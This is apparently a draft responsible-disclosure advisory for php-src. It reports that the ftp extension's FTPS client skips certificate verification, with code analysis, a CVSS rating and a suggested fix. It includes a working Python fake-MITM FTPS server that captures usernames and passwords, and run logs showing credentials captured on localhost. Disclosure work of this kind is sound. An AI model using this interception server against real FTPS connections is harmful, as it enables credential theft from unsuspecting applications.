## How to send

- **To:** https://github.com/php/php-src/security/advisories/new (the repository's private
  vulnerability reporting form; the repository has published advisories, so it is active)
- **Why this channel:** https://raw.githubusercontent.com/php/php-src/HEAD/SECURITY.md says
  "Please report security vulnerabilities on GitHub at:
  <https://github.com/php/php-src/security/advisories/new>"
- **Routing rule:** none; the same form takes every severity
- **Policy may exclude this:** "The use of legacy APIs or settings known to be insecure,
  particularly those documented as such, or those with a secure alternative."
  (https://raw.githubusercontent.com/php/php-src/HEAD/SECURITY.md); the advisory answers it in
  `### CVE request`
- **Packaging:** paste below the line into the form's Description; the form has no file
  attachments, so the PoC is inlined; no encryption key published
- **CVE:** ask in prose; the project usually has a CVE assigned for its published advisories

| Field | Value |
|---|---|
| Title | The ftp extension's FTPS client performs no peer certificate verification, allowing a MITM to capture credentials |
| Ecosystem | php |
| Package | php-src |
| Affected | all releases that share the current `ext/ftp` TLS code path (8.5.12 tested) |
| Patched | None |
| Severity | `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N` (7.4 High) |
| CWEs | CWE-295 |

---

# The ftp extension's FTPS client performs no peer certificate verification, allowing a MITM to capture credentials

### Summary

`ftp_login()` in `ext/ftp/ftp.c` upgrades an `ftp_ssl_connect()` connection to TLS with a client
context that never verifies the peer certificate, so any certificate — including a self-signed one
for a name that is not the server's — completes the handshake. We ran
`ftp_ssl_connect()` + `ftp_login()` against a local MITM FTPS server presenting a self-signed
certificate (`CN=not-the-real-server`): the handshake completed, `ftp_login()` returned true, and
the MITM logged `[tls] USER ftpuser` and `[tls] PASS secret-PASSWORD` in plaintext, with no
certificate warning on the client.

| Input to `ftp_login()` | Certificate | 8.5.12 @ 136e049 |
|---|---|---|
| control: plain `ftp_connect()` | none presented | no TLS handshake, credentials stay on the plaintext channel |
| `ftp_ssl_connect()` + login | self-signed, wrong name | **handshake completed, login true, credentials read by the MITM** |

Line numbers and results refer to **8.5.12** (`136e049`).

### Details

The attacker is on the network path between the PHP application and its FTP server, answers
`AUTH TLS` with a self-signed certificate, and the client completes the handshake against it and
sends the FTP username and password inside the attacker's tunnel. The application has no way to
prevent this: the ftp extension exposes no setting or API to supply a CA bundle or turn
verification on.

1. `ext/ftp/php_ftp.c:182` `PHP_FUNCTION(ftp_ssl_connect)` sets `use_ssl` on the connection
2. `ext/ftp/ftp.c:234` `ftp_login()` sees `use_ssl && !ssl_active` and sends `AUTH TLS`
3. `ext/ftp/ftp.c:271` the TLS client context is created with `SSL_CTX_new(SSLv23_client_method())`
   and configured with only `SSL_OP_ALL` and session-cache settings. **No
   `SSL_CTX_set_verify()` is ever called, no CA store is loaded and no hostname check is
   performed, so the context keeps OpenSSL's default `SSL_VERIFY_NONE`.**
4. `ext/ftp/ftp.c:297` `SSL_connect()` therefore completes against any peer certificate; the
   error-handling loop at `ext/ftp/ftp.c:297-330` only covers I/O and protocol errors, never
   verification
5. `ext/ftp/ftp.c:364-378` `USER` and `PASS` are sent through the unverified handle

**Missing:** a verification step — `SSL_CTX_set_verify()` with `SSL_VERIFY_PEER`, a CA store, and
a hostname check — anywhere between creating the context and `SSL_connect()`.

The rest of the code base guards the same kind of trust decision in `ext/openssl/xp_ssl.c`, which
calls `SSL_CTX_set_verify()` and sets up verification for the stream wrappers; `ext/ftp/ftp.c`
does not (read, not run). `SSL_CTX_set_verify` appears nowhere in `ext/ftp/`.

#### Reachability

- **Entry points:** `ftp_ssl_connect()` followed by `ftp_login()`; the `ftps://` stream wrapper
  sets `use_ssl` on the same `ftpbuf_t` and reaches the same code (read, not run)
- **Needs:** a build with FTP-SSL support (`--enable-ftp` with `--with-openssl`, `HAVE_FTP_SSL`
  defined), an application that logs in over FTPS, and an attacker with a machine-in-the-middle
  position on the path
- **Not enough:** plain `ftp_connect()` (the control run never reached the TLS code); SFTP over
  the ssh2 extension is a different protocol and code path
- **Doesn't help:** there is no ftp-extension setting or stream context option that turns
  verification on or supplies a CA bundle — the API offers no remedy
- **Not claimed:** file contents on the data channel were not transferred or read in the run; the
  data channel is negotiated on the same unverified handle (read, not run)
- **Not examined:** releases other than 8.5.12, forks, and non-Linux builds

### PoC

**Needs:** gcc, make, autoconf, bison, pkg-config, libssl-dev, python3 (re2c is fetched
automatically by `poc/run.sh` from github.com). Everything runs against localhost; the
self-signed key and certificate are committed under `poc/`.

<details>
<summary><code>poc/mitm_server.py</code></summary>

```python
#!/usr/bin/env python3
"""Fake FTPS MITM server.

Accepts one control connection, answers the FTP greeting, responds "234" to
AUTH TLS so the client upgrades to TLS immediately, then completes the TLS
handshake with a SELF-SIGNED certificate for CN=not-the-real-server and
records the plaintext FTP commands the client sends over that "encrypted"
channel (USER / PASS / PBSZ / PROT).

If any client ever aborted the handshake because of the untrusted
certificate, this process would print HANDSHAKE-FAILED and exit.

Writes the captured plaintext commands to the file given in argv[2] and
serves on 127.0.0.1:<argv[1]>.
"""
import socket
import ssl
import sys

HOST = "127.0.0.1"
CERT = "poc/mitm_server.pem"
KEY = "poc/mitm_server.key"

port = int(sys.argv[1])
outfile = sys.argv[2]

lines = []

srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind((HOST, port))
srv.listen(1)

conn, _ = srv.accept()
conn.settimeout(30)

# Send the FTP greeting (plaintext).
conn.sendall(b"220 fake-ftp MITM server ready\r\n")

# Read AUTH TLS, reply 234 -> client starts SSL_connect() right away.
auth = conn.recv(4096)
lines.append("[plain] " + auth.decode("latin1").strip())
if auth.upper().startswith(b"AUTH"):
    conn.sendall(b"234 AUTH TLS ok\r\n")
else:
    # Control run (plain FTP): the client never sends AUTH TLS, so no TLS
    # handshake can ever happen. Just reply to USER/PASS and stop.
    lines.append("NO-AUTH-TLS-RECEIVED: client never upgraded to TLS")
    conn.sendall(b"331 password required\r\n")
    nxt = conn.recv(4096)
    lines.append("[plain] " + nxt.decode("latin1").strip())
    conn.sendall(b"230 logged in\r\n")
    with open(outfile, "w") as f:
        f.write("\n".join(lines) + "\n")
    print("\n".join(lines))
    print("no TLS handshake attempted by either side; credentials stayed on the plaintext channel, no certificate was presented or accepted")
    srv.close()
    sys.exit(0)

ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
ctx.load_cert_chain(CERT, KEY)

try:
    tls = ctx.wrap_socket(conn, server_side=True)
except ssl.SSLError as e:
    lines.append("HANDSHAKE-FAILED: %s" % e)
    with open(outfile, "w") as f:
        f.write("\n".join(lines) + "\n")
    print("HANDSHAKE-FAILED: %s" % e)
    sys.exit(0)

lines.append("TLS-HANDSHAKE-COMPLETED with self-signed cert")

# Capture the plaintext FTP commands the client sends over TLS.
tls.settimeout(10)
while True:
    try:
        data = tls.recv(4096)
    except socket.timeout:
        break
    if not data:
        break
    for cmd in data.decode("latin1").split("\r\n"):
        if cmd:
            lines.append("[tls] " + cmd)
    # Answer commands so the client keeps going.
    up = data.upper()
    if up.startswith(b"USER"):
        tls.sendall(b"331 password required\r\n")
    elif up.startswith(b"PASS"):
        tls.sendall(b"230 logged in\r\n")
        break
    elif up.startswith(b"PBSZ"):
        tls.sendall(b"200 PBSZ ok\r\n")
    elif up.startswith(b"PROT"):
        tls.sendall(b"200 PROT ok\r\n")
    else:
        tls.sendall(b"200 ok\r\n")

with open(outfile, "w") as f:
    f.write("\n".join(lines) + "\n")
print("\n".join(lines))
srv.close()
```

</details>


```bash
git clone https://github.com/php/php-src repo
git -C repo checkout 136e049ac10b032c83018e65b63b6df858943750
OFFLINE= sh poc/run.sh baseline
OFFLINE= sh poc/run.sh control
```

Run from the directory that holds `poc/` and `repo/`. `run.sh` builds the PHP CLI
(`./configure --disable-all --enable-cli --enable-ftp --with-openssl`) and runs
`poc/poc.php` against `poc/mitm_server.py`, a local MITM FTPS server presenting the committed
self-signed certificate. The client calls the public API:

```php
$ftp = ftp_ssl_connect('127.0.0.1', $port, 15);
$ok  = ftp_login($ftp, 'ftpuser', 'secret-PASSWORD');
```

**Results** (2026-11-02, Linux aarch64, PHP CLI built from `136e049`, SHA-256
`be9da17782203e6f2172eb00f663fb65e9f27bb872cd02d9da29bcc811b4f7d1`):

| Input | Certificate | 8.5.12 @ 136e049 |
|---|---|---|
| control: `ftp_connect()` + login | none presented | no TLS handshake; MITM logged `NO-AUTH-TLS-RECEIVED` |
| `ftp_ssl_connect()` + login | self-signed, `CN=not-the-real-server` | **handshake completed, login true, credentials captured** |

The run shows the client accepting a certificate for a name that does not match the server,
completing the FTPS handshake with no warning, and the MITM decrypting the in-tunnel commands.

<details>
<summary><code>logs/baseline.stdout.log</code></summary>

```text
artifact: PHP CLI /tmp/tmpefjqbpgo/poc/../repo/sapi/cli/php
php-sha256 be9da17782203e6f2172eb00f663fb65e9f27bb872cd02d9da29bcc811b4f7d1
mode=baseline port=51377
mode=baseline PHP=8.5.12
calling ftp_ssl_connect(127.0.0.1, 51377)...
connect returned an FTP\Connection object; calling ftp_login(user, secret-PASSWORD)...
ftp_login() => true
[plain] AUTH TLS
TLS-HANDSHAKE-COMPLETED with self-signed cert
[tls] PBSZ 0
[tls] PROT P
[tls] USER ftpuser
[tls] PASS secret-PASSWORD
systype: false
VULNERABLE: ftp_ssl_connect() accepted a self-signed certificate and logged in over it

Warning: ftp_close(): SSL write failed in /tmp/tmpefjqbpgo/poc/poc.php on line 45

Warning: ftp_close(): SSL_shutdown failed in /tmp/tmpefjqbpgo/poc/poc.php on line 45
---- MITM server log (baseline) ----
[plain] AUTH TLS
TLS-HANDSHAKE-COMPLETED with self-signed cert
[tls] PBSZ 0
[tls] PROT P
[tls] USER ftpuser
[tls] PASS secret-PASSWORD
------------------------------------
EFFECT-PRESENT: the TLS handshake with a self-signed certificate completed and the MITM captured the credentials
```

</details>


### Impact

Any PHP application that logs in over `ftp_ssl_connect()` or the `ftps://` stream wrapper, on a
build with FTP-SSL support, sends its FTP credentials to whoever can intercept the connection. The
attacker chooses the network position and the certificate; everything else is the client's normal
behaviour.

`CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N` → **7.4 (High)**

| Metric | Value | Why |
|---|---|---|
| AV | Network | the attacker is on the network path to the FTP server |
| AC | High | a machine-in-the-middle position on that path is required |
| PR | None | only network reachability |
| UI | None | the application logs in on its own |
| S | Unchanged | the credentials and session are exposed, not the PHP process |
| C | High | the run shows the username and password read in plaintext by the MITM |
| I | High | the attacker holds the whole authenticated session |
| A | None | nothing in the run degrades or halts the client |

### CVE request

Please assign a CVE for this, with the affected range above and CWE-295.

On classification: the function's documentation states that "The connection established by
ftp_ssl_connect() will not do peer-certificate verification", and the security policy excludes
"the use of legacy APIs or settings known to be insecure, particularly those documented as such,
or those with a secure alternative". We report it anyway because the policy also classifies as
security issues bugs that "allow users to execute unauthorized actions" or "access data that is
not intended to be accessible", and this one captures credentials sent through an API whose name
and documentation promise a secure connection. The policy's own secure-alternative test is also
not met inside the extension: `ftps://` and `ftp_ssl_connect()` are the only FTPS entry points,
both share this code, and neither offers a CA bundle or verification option, so an application
cannot configure its way out. The classification is yours to make.

### Suggested fix

In `ftp_login()` at `ext/ftp/ftp.c:271`, after creating the context: load the default CA store
(`SSL_CTX_set_default_verify_paths()` or the php stream API's CA location), set
`SSL_CTX_set_verify(ctx, SSL_VERIFY_PEER, NULL)`, and set the expected peer name
(`SSL_set1_host()` / `SSL_set_verify_result()` handling) before `SSL_connect()` at
`ext/ftp/ftp.c:297`, failing the login with a warning when verification fails — the same trust
model `ext/openssl/xp_ssl.c` already applies to the stream wrappers. `not tested`; a follow-up
option to disable verification explicitly (as the openssl stream wrapper's `verify_peer` does)
would preserve the documented behaviour for callers who want it.

- **Same pattern elsewhere:** `ext/ftp/ftp.c` is the only place in `ext/ftp/` with a client
  context; `ext/openssl/xp_ssl.c` verifies. No other unverified client context was found.
